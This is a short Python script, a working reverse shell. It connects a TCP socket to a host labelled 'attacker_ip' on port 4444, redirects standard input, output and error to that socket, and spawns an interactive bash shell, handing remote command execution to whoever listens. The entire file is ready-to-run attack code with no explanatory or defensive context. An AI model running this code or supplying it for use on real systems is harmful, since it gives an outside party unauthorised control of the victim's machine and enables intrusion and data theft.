import socket
import subprocess
import os

attacker_ip = "10.0.0.1"
attacker_port = 4444

# socket create and connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((attacker_ip, attacker_port))

# redirect stdio->socket (os.dup2)
# 0: stdin, 1: stdout, 2: stderr
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# execution
subprocess.call(["/bin/bash", "-i"])
